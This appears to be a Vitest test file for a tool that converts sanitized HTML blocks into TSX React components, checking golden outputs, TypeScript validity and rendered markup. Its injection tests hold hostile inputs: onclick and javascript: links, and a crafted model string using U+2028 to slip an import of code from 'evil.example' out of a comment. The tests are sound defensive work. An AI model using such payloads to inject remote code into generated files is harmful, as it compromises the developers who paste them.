// «Copiar TSX» (spec §2.4): golden files, valid TSX (TypeScript parses it with no diagnostics), and the same markup as
// the sanitized HTML once React renders it. `UPDATE_GOLDEN=1 vitest run src/tsx.test.ts` rewrites the goldens.
import { existsSync, mkdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import * as React from "react";
import { renderToStaticMarkup } from "react-dom/server";
import ts from "typescript";
import { describe, expect, it } from "vitest";
import { sanitizeBlock } from "./sanitize";
import { blockToTsx, componentName, insignificantSpace, tsxAssetsModule } from "./tsx";
import { parseSanitized, type AiNode } from "./tree";

const GOLDEN = join(import.meta.dirname, "__golden__");

function golden(name: string, actual: string) {
  const file = join(GOLDEN, name);
  if (process.env.UPDATE_GOLDEN || !existsSync(file)) writeFileSync(file, actual);
  expect(actual).toBe(readFileSync(file, "utf8"));
}

const sanitize = (raw: string, blockId: string, screenIds: string[] = []) => {
  const result = sanitizeBlock(raw, { blockId, screenIds });
  if (!result.ok) throw new Error(result.failure);
  return result.html;
};

const HERO = sanitize(
  `<section data-block-id="b-hero" class="@container bg-linear-to-r from-primary to-primary-hover py-section">
<div class="mx-auto grid max-w-container gap-8 px-6 @3xl:grid-cols-12">
<div class="flex flex-col gap-5 @3xl:col-span-7">
<span class="inline-flex w-fit items-center gap-2 rounded-badge bg-primary-foreground/15 px-3 py-1 text-caption text-primary-foreground"><i data-icon="sparkle" aria-hidden="true" class="size-4"></i>Nuevo</span>
<h1 class="font-heading text-display font-bold leading-tight text-primary-foreground">Reserva tu corte en <em>dos</em> toques</h1>
<p class="text-body text-primary-foreground">Agenda, clientes y cobros {sin} líos &amp; sin <code>papel</code> &lt;3</p>
<div class="flex gap-3"><a href="#screen:s-precios" class="rounded-button bg-cta px-5 py-3 text-cta-foreground hover:bg-cta-hover">Empieza gratis</a> <a href="#screen:s-gone" class="rounded-button border border-primary-foreground/40 px-5 py-3 text-primary-foreground">Ver demo</a></div>
</div>
<div class="@3xl:col-span-5"><img data-placeholder="screenshot" alt="Agenda semanal" class="w-full rounded-card shadow-lg"><img data-asset="logo" alt="Brisa" class="h-6"></div>
</div></section>`,
  "b-hero",
  ["s-precios"],
);

const FORM = sanitize(
  `<div data-block-id="b-login" class="@container rounded-card bg-card p-6 shadow-card">
<h2 class="text-h2">Entrar</h2>
<label for="email" class="text-small">Email</label>
<input id="email" type="email" name="email" placeholder="tu@correo.com" value="ana@brisa.es" class="rounded-input border border-input px-3 py-2">
<label class="flex items-center gap-2"><input type="checkbox" checked> Recordarme</label>
<textarea name="note" class="rounded-input border border-input">Hola "amigos" {x}</textarea>
<select name="plan" disabled><option value="pro">Pro</option><option value="team" selected>Equipo</option></select>
<table class="w-full"><thead><tr><th scope="col" colspan="2">Plan</th></tr></thead><tbody><tr><td tabindex="0">A</td><td>B</td></tr></tbody></table>
<button type="submit" class="w-full rounded-button bg-primary py-3 text-primary-foreground">Entrar <i data-icon="arrow-right" aria-hidden="true"></i></button>
<p class="text-caption">¿Sin cuenta? <a href="#screen:s-signup">Crea una</a>.<br>Gratis.</p>
<hr class="border-border">
</div>`,
  "b-login",
  ["s-signup"],
);

const ROUTES = { "s-precios": "/precios", "s-signup": "/registro" };

/** TypeScript diagnostics of a TSX module (syntax and JSX). */
function diagnostics(source: string): string[] {
  const output = ts.transpileModule(source, {
    reportDiagnostics: true,
    fileName: "Block.tsx",
    compilerOptions: { jsx: ts.JsxEmit.React, module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2022 },
  });
  return (output.diagnostics ?? []).map((d) => ts.flattenDiagnosticMessageText(d.messageText, "\n"));
}

/**
 * Full type check with React's types (strict, `react-jsx`): the files a developer pastes must compile as they are.
 * Written under this package's node_modules so `react` resolves to its @types.
 */
function typeErrors(files: Record<string, string>): string[] {
  const dir = join(import.meta.dirname, "../node_modules/.cache/tsx-check");
  rmSync(dir, { recursive: true, force: true });
  mkdirSync(dir, { recursive: true });
  for (const [name, text] of Object.entries(files)) writeFileSync(join(dir, name), text);
  const program = ts.createProgram(
    Object.keys(files).map((name) => join(dir, name)),
    {
      jsx: ts.JsxEmit.ReactJSX,
      strict: true,
      noEmit: true,
      skipLibCheck: true,
      target: ts.ScriptTarget.ES2022,
      module: ts.ModuleKind.ESNext,
      moduleResolution: ts.ModuleResolutionKind.Bundler,
      lib: ["lib.es2022.d.ts", "lib.dom.d.ts"],
      types: [],
    },
  );
  const errors = ts.getPreEmitDiagnostics(program).map((d) => `${d.file?.fileName.split("/").pop() ?? ""}: ${ts.flattenDiagnosticMessageText(d.messageText, "\n")}`);
  rmSync(dir, { recursive: true, force: true });
  return errors;
}

/** Runs a TSX module with React and stub assets (`Icon` → `<i data-icon>`, `Placeholder` → `<img data-placeholder>`). */
function render(source: string, exportName: string): string {
  const js = ts.transpileModule(source, { compilerOptions: { jsx: ts.JsxEmit.React, module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2022 } }).outputText;
  const stubs = {
    Icon: ({ name, ...props }: { name: string }) => React.createElement("i", { "data-icon": name, ...props }),
    Placeholder: ({ kind, ...props }: { kind: string }) => React.createElement("img", { [kind === "logo" ? "data-asset" : "data-placeholder"]: kind, ...props }),
  };
  const exports: Record<string, () => React.ReactElement> = {};
  const require = (id: string) => (id === "react" ? React : stubs);
  new Function("exports", "require", "React", js)(exports, require, React);
  return renderToStaticMarkup(React.createElement(exports[exportName]!));
}

/** A tree for comparison: no inline-edit handles, attributes sorted, whitespace collapsed, empty texts gone. */
function normalized(html: string): unknown {
  const visit = (nodes: readonly AiNode[], parentIsBlock: boolean): unknown[] =>
    nodes.flatMap((node, index): unknown[] => {
      if (insignificantSpace(nodes, index, parentIsBlock)) return [];
      if (node.type === "text") return [node.value.replace(/\s+/g, " ")];
      const attrs = node.attrs.filter(([name]) => name !== "data-dl-t" && name !== "data-block-id").sort(([a], [b]) => a.localeCompare(b));
      return [{ tag: node.tag, attrs, children: visit(node.children, !/^(?:span|a|em|strong|small|i|label|button|time|mark|abbr|cite|b|u|s|sub|sup|q)$/.test(node.tag)) }];
    });
  return visit(parseSanitized(html), true);
}

describe("blockToTsx", () => {
  it("names components from the label and the block id", () => {
    expect(componentName("Hero", "b-hero")).toMatch(/^Hero[A-Z0-9][a-z0-9]{2}$/);
    expect(componentName("Precios · 3 planes", "x")).toMatch(/^Precios3Planes/);
    expect(componentName("¿Qué?", "x")).toMatch(/^Que/);
    expect(componentName("123", "x")).toMatch(/^Block123/);
    expect(componentName("Hero", "a")).not.toBe(componentName("Hero", "b"));
  });

  it("hero: golden, valid TSX, same markup as the sanitized HTML", () => {
    const tsx = blockToTsx(HERO, "b-hero", { label: "Hero", routes: ROUTES, model: "claude-haiku-5-5", createdAt: "2026-10-10T12:00:00.000Z" });
    golden("hero.tsx.golden", tsx);
    expect(diagnostics(tsx)).toEqual([]);
    expect(tsx).not.toContain("data-dl-t");
    expect(tsx).toContain('href="/precios"');
    const expected = HERO.replace('href="#screen:s-precios"', 'href="/precios"');
    expect(normalized(render(tsx, componentName("Hero", "b-hero")))).toEqual(normalized(expected));
  });

  it("forms and tables: golden, valid TSX, same markup", () => {
    const tsx = blockToTsx(FORM, "b-login", { label: "Formulario de acceso", routes: ROUTES });
    golden("login.tsx.golden", tsx);
    expect(diagnostics(tsx)).toEqual([]);
    expect(tsx).toContain("htmlFor=");
    expect(tsx).toContain("defaultValue=");
    expect(tsx).toContain("defaultChecked");
    expect(tsx).toContain("colSpan=");
    expect(tsx).toContain("tabIndex=");
    const expected = FORM.replace('href="#screen:s-signup"', 'href="/registro"');
    expect(normalized(render(tsx, componentName("Formulario de acceso", "b-login")))).toEqual(normalized(expected));
  });

  it("is deterministic and never carries anything the sanitizer would not", () => {
    expect(blockToTsx(HERO, "b-hero", { label: "Hero" })).toBe(blockToTsx(HERO, "b-hero", { label: "Hero" }));
    const tsx = blockToTsx(sanitize('<section data-block-id="b"><p onclick="x">{`${"${"}x}`}</p><a href="javascript:x">y</a></section>', "b"), "b", { label: "*/ evil \n line" });
    expect(diagnostics(tsx)).toEqual([]);
    expect(tsx).not.toMatch(/onclick|javascript/i);
    expect(tsx.split("\n")[0]).not.toContain("*/");
  });

  it("the header comment cannot be ended by U+2028/U+2029 (a crafted provenance.model)", () => {
    const tsx = blockToTsx(HERO, "b-hero", { label: "Hero\u2029x", model: "claude\u2028import('https://evil.example/x.js');//" });
    const header = tsx.split("\n")[0]!;
    expect(header).not.toMatch(/[\u2028\u2029]/);
    expect(tsx.split(/[\n\u2028\u2029]/).filter((line) => line.includes("evil.example"))).toHaveLength(1);
    expect(header).toContain("evil.example");
  });

  it("compiles with React's types in strict mode, with the assets module next to it", () => {
    const hero = blockToTsx(HERO, "b-hero", { label: "Hero", routes: ROUTES });
    const login = blockToTsx(FORM, "b-login", { label: "Login", routes: ROUTES });
    expect(typeErrors({ "Hero.tsx": hero, "Login.tsx": login, "dialmade-assets.tsx": tsxAssetsModule() })).toEqual([]);
    // The check is not vacuous: a string where React wants a number fails.
    expect(typeErrors({ "Bad.tsx": 'export const Bad = () => <td colSpan="2" />;\n' })).toHaveLength(1);
  }, 30_000);

  it("the assets module: golden and valid TSX", () => {
    const assets = tsxAssetsModule();
    golden("dialmade-assets.tsx.golden", assets);
    expect(diagnostics(assets)).toEqual([]);
    const js = ts.transpileModule(assets, { compilerOptions: { jsx: ts.JsxEmit.React, module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2022 } }).outputText;
    const exports: Record<string, (props: Record<string, unknown>) => React.ReactElement> = {};
    new Function("exports", "require", "React", js)(exports, () => React, React);
    expect(renderToStaticMarkup(React.createElement(exports.Icon!, { name: "check", className: "size-4" }))).toContain('<path d="M5 12.5l4.5 4.5L19 7.5"></path>');
    const photo = renderToStaticMarkup(React.createElement(exports.Placeholder!, { kind: "photo", alt: "Equipo", className: "w-full" }));
    expect(photo).toMatch(/^<svg[^>]*class="w-full"[^>]*role="img"[^>]*aria-label="Equipo"/);
    expect(photo).toContain("fill:var(--muted, #eee)");
  });
});
